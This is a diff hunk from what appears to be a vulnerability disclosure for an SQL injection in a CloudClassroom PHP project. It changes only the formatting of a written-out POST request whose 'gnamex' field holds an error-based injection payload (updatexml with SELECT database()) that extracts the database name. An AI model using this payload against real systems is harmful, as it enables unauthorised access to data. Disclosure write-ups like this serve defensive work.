@@ -44,10 +44,10 @@ http://<target>/CloudClassroom-PHP-Project-master/postquerypublic
 Intercept the request (e.g., with Burp Suite) or craft a manual POST:
 
 
-POST /CloudClassroom-PHP-Project-master/postquerypublic
-Content-Type: application/x-www-form-urlencoded
+- POST /CloudClassroom-PHP-Project-master/postquerypublic
+- Content-Type: application/x-www-form-urlencoded
 
-gnamex=a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1&email=test@test.com&squeryx=test&update=Post Query!
+- gnamex=a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1&email=test@test.com&squeryx=test&update=Post Query!
 
 Observe the response returning:
 
